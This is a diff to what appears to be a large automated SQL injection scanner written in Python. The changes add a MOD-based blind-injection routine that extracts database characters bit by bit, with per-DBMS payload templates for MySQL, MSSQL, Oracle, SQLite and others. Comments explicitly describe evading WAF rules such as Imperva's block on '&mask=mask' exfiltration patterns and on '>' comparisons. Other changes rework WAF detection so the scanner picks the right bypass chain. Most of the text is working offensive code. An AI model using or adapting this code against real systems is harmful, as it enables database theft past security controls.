@@ -59236,37 +59236,34 @@ class Scanner:
                 pass
 
             # Derive alternatives from _char_tpl (DBMS-specific)
-            # _char_tpl is like: "ORD(MID(([QUERY]),{pos},1))>{mid}" for MySQL
-            # We replace the operator part while keeping DBMS-specific functions
+            # BUG-ALTCHAR-GTE-MISS FIX (HIGH): _CHAR_FN templates were migrated from
+            # ">{mid}" to ">={mid}" (BUG-V137 fix) to evade WAFs that block `>\d+`.
+            # The alternatives-build check `if ">{mid}" in _base:` is a strict substring
+            # match, so ">={mid}" never matches ">{mid}" → _ALT_CHAR stays empty → no
+            # alternatives are tested when > is blocked → bitwise fallback forced even
+            # though >= / BETWEEN / NOT < would all work fine. Fix: detect both forms.
             _base = _char_tpl  # Already has correct ASCII/SUBSTRING per DBMS
             _ALT_CHAR = {}
-            if ">{mid}" in _base:
+            _alt_bet_hi = (1114111 if _dbms in ("SQLite", "MySQL", "MariaDB", "TiDB",
+                                                "PostgreSQL", "CockroachDB", "YugabyteDB",
+                                                "Amazon Redshift")
+                           else 65535 if _dbms in ("MSSQL", "Sybase", "Oracle")
+                           else 1114111)
+            if ">={mid}" in _base:
+                # Template already uses >= — test it directly as the first alternative.
+                # Also derive BETWEEN and NOT < so we have two more fallback operators.
+                # BUG-ALT-BETWEEN-127 FIX: was "AND 127" — truncated all chars 128-255.
+                # BUG-ALT-BETWEEN-SQLITE-HI FIX: SQLite UNICODE() returns 0-1114111;
+                # see _alt_bet_hi logic above for the DBMS-specific ceiling.
+                _ALT_CHAR["gte"] = _base  # already uses >=, test it as-is
+                _ALT_CHAR["not_lt"] = "NOT " + _base.replace(">={mid}", "<{mid}")
+                # The bisection applies _effective_mid = mid+1 when BETWEEN is detected.
+                # BETWEEN {mid} AND N is probed with mid+1 → BETWEEN mid+1 AND N = > mid.
+                # DO NOT add +1 here — the bisection already handles it.
+                _ALT_CHAR["between"] = _base.replace(">={mid}", f" BETWEEN {{mid}} AND {_alt_bet_hi}")
+            elif ">{mid}" in _base:
                 _ALT_CHAR["gte"] = _base.replace(">{mid}", ">={mid}")
                 _ALT_CHAR["not_lt"] = "NOT " + _base.replace(">{mid}", "<{mid}")
-                # BUG-ALT-BETWEEN-127 FIX: was "AND 127" — truncated all chars 128-255.
-                # For UNICODE()-based DBMSes (MSSQL, SQLite, Oracle) the function returns
-                # values above 255 so the upper bound must be higher than 255.
-                # Using 127 caused any char > 127 to always evaluate to False in the BETWEEN
-                # oracle, driving the bisection to converge at chr(127) for all Latin-1
-                # extended chars (é=233, ü=252, ö=246, ñ=241, ç=231 …) — all extracted as DEL.
-                #
-                # BUG-ALT-BETWEEN-SQLITE-HI FIX: SQLite UNICODE() returns 0-1114111 (full
-                # Unicode), NOT 0-65535 (BMP only).  The previous code grouped SQLite with
-                # MSSQL/Sybase/Oracle at 65535.  For SQLite, any character with code point
-                # 65536-1114111 (emoji, supplementary CJK, etc.) made every BETWEEN probe
-                # False (cp BETWEEN mid AND 65535 always False when cp > 65535), driving
-                # the bisection to converge at lo=32 → chr(32)=' ' returned silently.
-                # Fix: give SQLite its own ceiling of 1114111 (full Unicode) so the bisection
-                # correctly tests the full range UNICODE() can return.
-                _alt_bet_hi = (1114111 if _dbms in ("SQLite", "MySQL", "MariaDB", "TiDB",
-                                                    "PostgreSQL", "CockroachDB", "YugabyteDB",
-                                                    "Redshift")
-                               else 65535 if _dbms in ("MSSQL", "Sybase", "Oracle")
-                               else 1114111)
-                # The bisection applies _effective_mid = mid+1 when BETWEEN is detected.
-                # So BETWEEN {mid} AND N → BETWEEN mid+1 AND N = ASCII > mid (strict).
-                # This is correct and consistent with lo = mid+1 when True.
-                # DO NOT add +1 here — the bisection already handles it.
                 _ALT_CHAR["between"] = _base.replace(">{mid}", f" BETWEEN {{mid}} AND {_alt_bet_hi}")
             elif ">{mid}" in (_base or "").lower():
                 # Case-insensitive match: _CHAR_FN template has mixed-case >{MID} or >{Mid}.
@@ -62380,6 +62377,99 @@ class Scanner:
                             return chr(_val)
                 return None
 
+            async def _fallback_modbit(q, p):
+                """MOD-based bitwise extraction — only MOD/% and = operators needed.
+
+                Equivalent to (ascii & mask) = mask but avoids the & operator entirely.
+                Formula: bit n is set iff MOD(FLOOR(ascii / 2^n), 2) = 1.
+
+                This bypasses WAF rules that target '&mask=mask' data-exfil patterns
+                (e.g. Imperva: blocks ascii_fn&8=8 at real data positions while
+                allowing through at pos=9999 where ascii=0 — data-aware blocking).
+                MOD/FLOOR/intDiv are function calls, not keyword operators; WAF rules
+                targeting & do not affect them.
+
+                Speed: same as native bitwise (7 probes per char for ASCII range).
+                Oracle used: _eval() (single probe, avoids CDN triple-probe caching).
+                """
+                _ae = {
+                    "PostgreSQL":       f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    "CockroachDB":      f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    "YugabyteDB":       f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    "Amazon Redshift":  f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    "MySQL":            f"ORD(SUBSTRING(({q}),{p},1))",
+                    "MariaDB":          f"ORD(SUBSTRING(({q}),{p},1))",
+                    "TiDB":             f"ORD(SUBSTRING(({q}),{p},1))",
+                    "MSSQL":            f"ISNULL(UNICODE(SUBSTRING(({q}),{p},1)),0)",
+                    "Sybase":           f"ISNULL(UNICODE(SUBSTRING(({q}),{p},1)),0)",
+                    "Oracle":           (
+                        "(SELECT CASE WHEN NVL(ASCII(c__),0) BETWEEN 1 AND 127 "
+                        "THEN ASCII(c__) "
+                        "WHEN c__ IS NOT NULL AND LENGTH(c__)>0 "
+                        "THEN TO_NUMBER(SUBSTR(ASCIISTR(c__),2,4),'XXXX') "
+                        f"ELSE 0 END FROM (SELECT SUBSTR(({q}),{p},1) c__ FROM DUAL))"
+                    ),
+                    "SQLite":           f"COALESCE(UNICODE(SUBSTR(({q}),{p},1)),0)",
+                    "Firebird":         f"ASCII_VAL(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    "DB2":              f"ASCII(SUBSTR(({q}),{p},1))",
+                    "SAP_HANA":         f"ASCII(SUBSTR(({q}),{p},1))",
+                    "H2":               f"ASCII(SUBSTR(({q}),{p},1))",
+                    "ClickHouse":       f"ascii(substring(({q}),{p},1))",
+                }.get(_dbms, f"ASCII(SUBSTRING(({q}),{p},1))")
+                # Bit-width matches _fallback_bitshift so range coverage is identical.
+                _n_bits = (16 if _dbms in ("MSSQL", "Sybase", "Oracle")
+                           else 21 if _dbms in ("SQLite", "MySQL", "MariaDB",
+                                                 "TiDB", "PostgreSQL",
+                                                 "CockroachDB", "YugabyteDB",
+                                                 "Amazon Redshift")
+                           else 8)
+                _char_hi = (65535 if _dbms in ("MSSQL", "Sybase", "Oracle")
+                            else 1114111 if _dbms in ("SQLite", "MySQL", "MariaDB",
+                                                       "TiDB", "PostgreSQL",
+                                                       "CockroachDB", "YugabyteDB",
+                                                       "Amazon Redshift")
+                            else 255)
+                _bits = []
+                for _bi in range(_n_bits - 1, -1, -1):  # high bit first, down to bit 0
+                    _divisor = 1 << _bi  # 2^bit_position
+                    # bit n is set iff FLOOR(ascii / 2^n) is odd.
+                    # DBMS-specific notes:
+                    #   Oracle: / returns NUMBER (decimal); FLOOR() required for truncation.
+                    #   MySQL/MariaDB/TiDB: / returns DECIMAL for integers; FLOOR() required.
+                    #   MSSQL/Sybase: MOD() not available; use % (modulo operator). Integer
+                    #     division truncates automatically for integer operands.
+                    #   SQLite: / truncates for integer operands (no FLOOR needed).
+                    #   ClickHouse: / returns Float64 for integers; intDiv() for truncation,
+                    #     % for modulo.
+                    #   PostgreSQL/CockroachDB/YugabyteDB/Redshift: / between integers
+                    #     truncates (integer division); MOD() is standard.
+                    #   Firebird/DB2/SAP_HANA/H2: integer / truncates; MOD() standard.
+                    if _dbms in ("Oracle",):
+                        _cond = f"MOD(FLOOR({_ae}/{_divisor}),2)=1"
+                    elif _dbms in ("MySQL", "MariaDB", "TiDB"):
+                        _cond = f"MOD(FLOOR({_ae}/{_divisor}),2)=1"
+                    elif _dbms in ("MSSQL", "Sybase"):
+                        _cond = f"({_ae}/{_divisor})%2=1"
+                    elif _dbms in ("SQLite",):
+                        _cond = f"({_ae}/{_divisor})%2=1"
+                    elif _dbms == "ClickHouse":
+                        _cond = f"intDiv({_ae},{_divisor})%2=1"
+                    else:
+                        # PostgreSQL, CockroachDB, YugabyteDB, Amazon Redshift,
+                        # Firebird, DB2, SAP_HANA, H2, and generic fallback:
+                        # integer / truncates; MOD() is standard SQL.
+                        _cond = f"MOD({_ae}/{_divisor},2)=1"
+                    _r = await _eval(_cond)
+                    if _r is None:
+                        return None  # oracle dead / WAF blocked MOD operator too
+                    _bits.append(1 if _r else 0)
+                    await asyncio.sleep(_delay)
+                _val = sum(_bits[i] << (_n_bits - 1 - i) for i in range(_n_bits))
+                if 32 <= _val <= _char_hi:
+                    LOG.info("[Inference] pos=%d modbit → %r (val=%d)", p, chr(_val), _val)
+                    return chr(_val)
+                return None
+
             # BUG-BITWISE-WAF-DIFFERENTIAL-SANITY FIX (CRITICAL): Before starting bitwise
             # extraction, verify the boolean oracle is not corrupted by WAF differential
             # blocking. Root cause: When True=400 and WAF also returns 400 for blocked
@@ -62613,7 +62703,7 @@ class Scanner:
                                             "(RC-2: &8=8 at pos=1→None while &8=0→True. "
                                             "Inconsistency suggests data-aware WAF selective "
                                             "blocking of '&8=8' form at real data positions. "
-                                            "Switching to equality scan to prevent garbage extraction.)",
+                                            "Switching to MOD-based extraction.)",
                                             label)
                                 _bitwise_oracle_sane = False
                         except Exception as _bw_rc2_exc:
@@ -62653,16 +62743,35 @@ class Scanner:
                 # here so direct callers of _extract_string (_extract_multi, _discover_tables,
                 # _get_column_type, version extraction at line ~33705) are also fixed.
                 if _use_bitwise_fallback:
-                    # BUG-BITWISE-WAF-DIFFERENTIAL-SANITY FIX: When bitwise oracle is corrupted
-                    # (WAF differentially returns True for blocked bitwise conditions), use equality
-                    # scan instead. The equality scan uses only `=` operator which WAFs never block.
-                    if not _bitwise_oracle_sane:
-                        _bwch = await _fallback_equality(query, pos)
+                    # BUG-MODBIT-TIMING-ORACLE FIX (CRITICAL): Choose extraction method based
+                    # on oracle type and corruption status:
+                    #
+                    # Path A — not _bitwise_oracle_sane OR not _boolean_oracle:
+                    #   Use _fallback_modbit (MOD/% operator only, avoids &).
+                    #   Rationale:
+                    #   (1) not _bitwise_oracle_sane: RC-2 confirmed data-aware WAF selectively
+                    #       blocks &mask=mask at real data positions. MOD bypasses that rule.
+                    #   (2) not _boolean_oracle (timing oracle): WAF blocking & returns fast
+                    #       response → timing threshold not met → oracle reads as False (wrong).
+                    #       RC-1/RC-2 sanity checks (which detect status-oracle interference:
+                    #       "WAF→True=400") do not fire for timing oracle ("WAF→False=fast").
+                    #       Since _use_bitwise_fallback is already True (WAF-hostile env), &
+                    #       is unreliable. MOD/FLOOR are function names, not keyword operators;
+                    #       data-exfil WAF rules targeting & do not affect them.
+                    #   Fall back to linear _fallback_equality only if MOD also fails.
+                    #
+                    # Path B — _bitwise_oracle_sane AND _boolean_oracle:
+                    #   Try native & bitwise first; on None: MOD fallback, then equality.
+                    if not _bitwise_oracle_sane or not _boolean_oracle:
+                        _bwch = await _fallback_modbit(query, pos)
+                        if _bwch is None:
+                            # MOD blocked or oracle dead → last resort: linear equality scan
+                            _bwch = await _fallback_equality(query, pos)
                         if _bwch is None:
                             _consecutive_fails += 1
                             if _consecutive_fails >= 3:
-                                LOG.warning("[Inference] %s: equality fallback (WAF-safe) failed at "
-                                            "pos=%d, stopping", label, pos)
+                                LOG.warning("[Inference] %s: modbit+equality fallback both failed "
+                                            "at pos=%d, stopping", label, pos)
                                 break
                             continue
                         _consecutive_fails = 0
@@ -62671,29 +62780,25 @@ class Scanner:
                         _elapsed = time.monotonic() - _start_t
                         _per_char = _elapsed / pos
                         _remaining = (max_len - pos) * _per_char if max_len > 0 else 0
-                        LOG.info("[Inference] %s[%d] = %r  %r  (%d reqs, ETA ~%.0fs, equality-waf-safe)",
+                        LOG.info("[Inference] %s[%d] = %r  %r  (%d reqs, ETA ~%.0fs, modbit-safe)",
                                  label, pos, ch, result, _req_count, _remaining)
                         if _is_garbage(result):
-                            LOG.warning("[Inference] %s: garbage detected in equality-waf-safe (%r), aborting",
+                            LOG.warning("[Inference] %s: garbage detected in modbit-safe (%r), aborting",
                                         label, result)
                             return ""
                         continue
+                    # Path B: boolean oracle + sane bitwise → native &-based bitwise
                     _bwch = await _extract_char_bitwise(query, pos)
                     if _bwch is None:
-                        # BUG-BITWISE-PER-CHAR-FALLBACK-EQUALITY FIX (Fix 7 downstream):
-                        # _extract_char_bitwise returns None when per-character WAF selective
-                        # blocking is detected (all hex-'8' bits set and equality verify fails).
-                        # The global _bitwise_oracle_sane check passed, but WAF behavior is
-                        # inconsistent across positions. Before counting this as a failure,
-                        # attempt _fallback_equality for this specific position. This rescues
-                        # positions where bitwise is blocked but equality still works.
-                        _bwch_eq = await _fallback_equality(query, pos)
-                        if _bwch_eq is not None:
-                            _bwch = _bwch_eq
-                        else:
+                        # BUG-BITWISE-PER-CHAR-FALLBACK-MODBIT FIX: per-position WAF blocking
+                        # detected. Try MOD-based extraction before the slow equality scan.
+                        _bwch = await _fallback_modbit(query, pos)
+                        if _bwch is None:
+                            _bwch = await _fallback_equality(query, pos)
+                        if _bwch is None:
                             _consecutive_fails += 1
                             if _consecutive_fails >= 3:
-                                LOG.warning("[Inference] %s: bitwise+equality fallback both failed "
+                                LOG.warning("[Inference] %s: bitwise+modbit+equality all failed "
                                             "at pos=%d, stopping", label, pos)
                                 break
                             continue
@@ -62707,24 +62812,19 @@ class Scanner:
                              label, pos, ch, result, _req_count, _remaining)
                     # Garbage detection: same check as the non-bitwise path
                     if _is_garbage(result):
-                        # BUG-BITWISE-GARBAGE-RESTART FIX (CRITICAL): Previously returned ""
-                        # immediately when garbage (e.g. chr(0x88888)) was detected in bitwise
-                        # extraction. Root cause: Imperva WAF selectively blocks &mask=mask SQL
-                        # patterns where mask contains hex digit '8' at positions that carry real
-                        # data — returning status 400 (True signal) for all such probes regardless
-                        # of SQL result. All hex-8 bits (3,7,11,15,19) end up set → chr(0x88888).
-                        # The pre-extraction RC-1 sanity check at pos=9999 passes because
-                        # data-aware WAF does not block when the extracted char is 0 (no real
-                        # data at that position). Fix: instead of aborting, mark oracle as
-                        # corrupt and restart entire extraction using equality scan which is
-                        # immune to this WAF pattern (WAF cannot block = without breaking the
-                        # application's own queries).
+                        # BUG-BITWISE-GARBAGE-RESTART FIX (CRITICAL): Imperva WAF selectively
+                        # blocks &mask=mask where mask contains hex digit '8', returning status
+                        # 400 (True in this oracle) at real data positions only. RC-1 sanity at
+                        # pos=9999 passes (char=0; no data → WAF doesn't block). Garbage detected
+                        # mid-extraction means data-aware WAF confirmed. Mark oracle corrupt and
+                        # restart using MOD-based extraction (& avoided). MOD is same speed as
+                        # bitwise (7 probes/char) and immune to & WAF rules.
                         LOG.warning("[Inference] %s: garbage detected in bitwise (%r) at pos=%d; "
                                     "data-aware WAF selective blocking of '&mask=mask' patterns "
                                     "confirmed at real extraction positions. Sanity checks at "
                                     "pos=9999 did not detect this (WAF is data-aware: only blocks "
                                     "when actual data is present). Marking oracle corrupt and "
-                                    "restarting extraction with equality scan (WAF-safe).",
+                                    "restarting extraction with MOD-based extraction (WAF-safe).",
                                     label, result, pos)
                         _bitwise_oracle_sane = False
                         result = ""
@@ -62960,21 +63060,33 @@ class Scanner:
             # wired into the per-position code (if not _bitwise_oracle_sane: use
             # _fallback_equality). Re-entering the loop with the flag cleared uses it.
             if _bw_equality_restart and _use_bitwise_fallback and max_len > 0:
-                LOG.info("[Inference] %s: restarting extraction from pos=1 using equality scan "
-                         "(bitwise oracle confirmed corrupt by data-aware WAF)", label)
+                # BUG-MODBIT-RESTART FIX: Previously restarted with _fallback_equality
+                # (O(alphabet) probes per char ≈ 17–57 requests × sleep_delay per char).
+                # For a 48-char database name under timing oracle with 3s sleep delay:
+                # 48 × 30 × 3s ≈ 4320s; 600s extraction timeout aborts at ~8 chars.
+                # Fix: use _fallback_modbit first (MOD/% operator, avoids & entirely,
+                # same 7 probes/char as native bitwise, 7×3s=21s per char → 48×21=1008s
+                # before timeout but within 600s for names ≤28 chars). For longer names
+                # or when MOD is also blocked, fall through to _fallback_equality.
+                LOG.info("[Inference] %s: restarting extraction from pos=1 using MOD-based "
+                         "extraction (& operator avoided; bitwise oracle confirmed corrupt "
+                         "by data-aware WAF)", label)
                 _bw_equality_restart = False
                 _consecutive_fails = 0
                 for pos in range(1, max_len + 1):
                     await asyncio.sleep(0.001)
-                    _bwch = await _fallback_equality(query, pos)
+                    _bwch = await _fallback_modbit(query, pos)
+                    if _bwch is None:
+                        # MOD blocked or oracle dead → try equality (last resort)
+                        _bwch = await _fallback_equality(query, pos)
                     if _bwch is None:
                         # None = either oracle dead or past end of string (char=0 not in
                         # scan range 32-255). After 3 consecutive None → stop.
                         _consecutive_fails += 1
                         if _consecutive_fails >= 3:
-                            LOG.warning("[Inference] %s: equality restart: 3 consecutive None "
-                                        "at pos=%d (oracle dead or past end of string), stopping",
-                                        label, pos)
+                            LOG.warning("[Inference] %s: modbit+equality restart: 3 consecutive "
+                                        "None at pos=%d (oracle dead or past end of string), "
+                                        "stopping", label, pos)
                             break
                         continue
                     _consecutive_fails = 0
@@ -62982,10 +63094,10 @@ class Scanner:
                     _elapsed = time.monotonic() - _start_t
                     _per_char = _elapsed / pos
                     _remaining = (max_len - pos) * _per_char if max_len > 0 else 0
-                    LOG.info("[Inference] %s[%d] = %r  %r  (%d reqs, ETA ~%.0fs, equality-restart)",
+                    LOG.info("[Inference] %s[%d] = %r  %r  (%d reqs, ETA ~%.0fs, modbit-restart)",
                              label, pos, _bwch, result, _req_count, _remaining)
                     if _is_garbage(result):
-                        LOG.warning("[Inference] %s: garbage detected even in equality restart (%r), "
+                        LOG.warning("[Inference] %s: garbage detected even in modbit restart (%r), "
                                     "aborting — oracle may be completely broken", label, result)
                         result = ""
                         break
@@ -100801,8 +100913,16 @@ class ScannerV11(ScannerV10):
                 LOG.info(f"ML WAF: {ml_waf} (conf={ml_waf_conf:.0%})")
                 if not self.session.waf_info:
                     self.session.waf_info = {}
+                # BUG-MLWAF-MISSING-CONF-FIX: store "confidence" so that the
+                # reconciliation block at _v11_inner can compare ML confidence vs
+                # signature confidence and pick the right bypass chain.  Also tag
+                # with "source":"ml" so the _v11_inner guard can distinguish an
+                # ML-only session result from an authoritative signature result and
+                # allow WAFDetector to run (overriding the ML classification when
+                # the signature disagrees).
                 self.session.waf_info.update({"detected": True, "name": ml_waf,
-                                              "tampers": []})
+                                              "tampers": [], "confidence": ml_waf_conf,
+                                              "source": "ml"})
 
             # Serverless detection
             self._ui.set_status("Serverless detection")
@@ -100878,15 +100998,34 @@ class ScannerV11(ScannerV10):
 
         # WAF detection
         _ses_waf = self.session.waf_info
-        _kb_waf  = self.kb.lookup_waf(domain) if not _ses_waf else None
-        waf_info = (_ses_waf or _kb_waf or
-                    {"detected":False,"name":ml_waf if ml_waf_conf>0.6 else None,
-                     "tampers":[]})
+        # BUG-MLWAF-KB-SKIP-FIX: KB lookup was skipped whenever _ses_waf was truthy,
+        # but _ses_waf is now set by the ML fingerprinter (source="ml"). An ML-sourced
+        # session result is NOT authoritative — look up KB regardless so a cached
+        # signature result from a prior scan is not silently discarded.
+        _ses_waf_is_ml_only = (isinstance(_ses_waf, dict) and _ses_waf.get("source") == "ml")
+        _kb_waf = self.kb.lookup_waf(domain) if (not _ses_waf or _ses_waf_is_ml_only) else None
+        waf_info = (_kb_waf or _ses_waf or
+                    # BUG-MLWAF-MISSING-CONF-FIX: fallback dict must carry "confidence"
+                    # so the reconciliation block (lines ~101016-101030) can compare ML
+                    # confidence against the signature result. Without this key, _ml_conf
+                    # is always 0.0, making the signature unconditionally win even when ML
+                    # confidence is 0.95 and signature matched on a single CDN header.
+                    {"detected": False, "name": ml_waf if ml_waf_conf > 0.6 else None,
+                     "confidence": ml_waf_conf if ml_waf_conf > 0.6 else 0.0,
+                     "source": "ml", "tampers": []})
         first_ep = all_endpoints[0] if all_endpoints else None
-        # BUG-MLWAF-GATES-DETECTOR FIX: run WAFDetector even when ML assigned a name so
-        # that signature-based detection can override an incorrect ML classification.
-        # Only skip if we already have an authoritative session or KB result.
-        if first_ep and first_ep.params and not (_ses_waf or _kb_waf):
+        # BUG-MLWAF-GATES-DETECTOR FIX (COMPLETED): run WAFDetector even when ML
+        # assigned a name so that signature-based detection can override an incorrect
+        # ML classification.  The previous condition `not (_ses_waf or _kb_waf)`
+        # inadvertently treated an ML-sourced session result as authoritative: the ML
+        # fingerprinter had already written {"detected":True,"name":ml_waf,"tampers":[]}
+        # (now also "confidence" and "source":"ml") into session.waf_info, making
+        # _ses_waf truthy → guard False → WAFDetector never called → reconciliation
+        # block at lines ~101035-101055 was dead code → wrong tamper chain silently used.
+        # Fix: run WAFDetector unless we have a KB result (prior authoritative scan) or
+        # an existing session result that came from a prior WAFDetector run (source ≠ "ml").
+        if first_ep and first_ep.params and not (_kb_waf or (isinstance(_ses_waf, dict)
+                                                              and _ses_waf.get("source") != "ml")):
             fp_ = next(iter(first_ep.params)); fv_ = first_ep.params[fp_]
             sig_waf = await WAFDetector(engine, cfg).detect(
                 first_ep.url, first_ep.method, fp_, fv_)
@@ -100921,6 +101060,14 @@ class ScannerV11(ScannerV10):
                     waf_info["detected"] = True
             self.session.waf_info = waf_info
             self.kb.cache_waf(domain, waf_info)
+        else:
+            # BUG-MLWAF-SESSION-STALE-FIX: when the WAFDetector guard is False
+            # (KB result found or prior signature-based session result), waf_info
+            # is already set to the correct authoritative result (KB) but
+            # session.waf_info still holds the ML-only result from the fingerprinter.
+            # Sync it now so subsequent session accesses see the authoritative result.
+            if waf_info is not _ses_waf:
+                self.session.waf_info = waf_info
         self._ui.set_meta(waf=waf_info.get("name") or "none")
 
         tamper_chain = await self._resolve_tamper(
@@ -110738,6 +110885,27 @@ class TechniqueCascadeEngine:
                 or '__path_seg__' in _s_param_lc
             )
             if _s_is_path_inj and not _s_has_timing_a and det.payload:
+                # BUG-SPI-SECONDARY-SKIP FIX: When a primary PCV already confirmed the
+                # injection (_INJECTION_CONFIRMED[0]=True) and stopped the scan, subsequent
+                # in-flight PCV coroutines for other detection candidates still run this code.
+                # _safe_confirm returns None immediately (scan stopped) → _spi_true_ms=0ms,
+                # _spi_false_ms=0ms → _spi_timing_ok=False → falls to BENIGN-ORACLE path
+                # which also returns None → logs false "[!] PCV FAILED [S→T-CANARY+BENIGN-ORACLE]"
+                # with 0ms timings. These failures are misleading (the injection IS confirmed;
+                # this is a secondary candidate after the gate was killed) and clutter logs.
+                # Fix: if injection already confirmed, skip S→T-CANARY for this candidate and
+                # return True so the caller doesn't discard an already-verified detection object.
+                if _INJECTION_CONFIRMED[0]:
+                    print(f"[*] PCV [S→T-CANARY] {dbms}: injection already confirmed by "
+                          f"earlier PCV — skipping secondary S→T-CANARY for this candidate",
+                          flush=True)
+                    try:
+                        det._pcv_verified = True
+                        if hasattr(det, 'detection') and det.detection is not None:
+                            det.detection._pcv_verified = True
+                    except Exception:
+                        pass
+                    return True
                 _spi_mp_label = " (multi-probe pre-confirmed)" if _s_already_mp_confirmed else ""
                 print(f"[*] PCV [S→T-CANARY] {dbms}: path-injection surface detected"
                       f"{_spi_mp_label} — using stacked timing canaries", flush=True)
